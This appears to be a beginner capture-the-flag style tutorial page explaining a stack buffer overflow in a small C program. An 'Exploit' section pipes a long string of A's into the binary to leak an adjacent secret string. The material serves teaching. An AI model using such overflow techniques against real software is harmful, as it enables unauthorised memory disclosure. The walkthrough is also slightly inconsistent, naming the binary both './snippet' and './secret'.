# Stack 0verflow

### Example:

<script src="https://gist.github.com/n41n4/496691de46d5202aec5585a722763ffa.js?file=snippet.c"></script>

### AIM:
To print the secret.

### Analysis
Execution flow of above example
1. A secret variable is created with some secret value.
2. Then a buffer is initialized with the capacity of 128.
3. User input will be stored in buffer variable using `read` function.
3. Finally User input will be echoed back with welcome using printf.

```bash
inc0gn1t0@inc0gn1t0-VirtualBox:~/Redacted$ ./snippet 
Guest
Welcome Guest
```

### Exploit:


```bash

inc0gn1t0@inc0gn1t0-VirtualBox:~/Redacted$ echo "AAAAAAAAAAAAA......AAAAAAAA" | ./secret 
Welcome AAAAAAAAAAAAA......AAAAAAAASup3r_S3cr37_S7r1n6

```

### Explanation
Here the culprit is `read` function.In this context `read` is used to take input from user.


### Practice
- [Task](Practice-1.html)
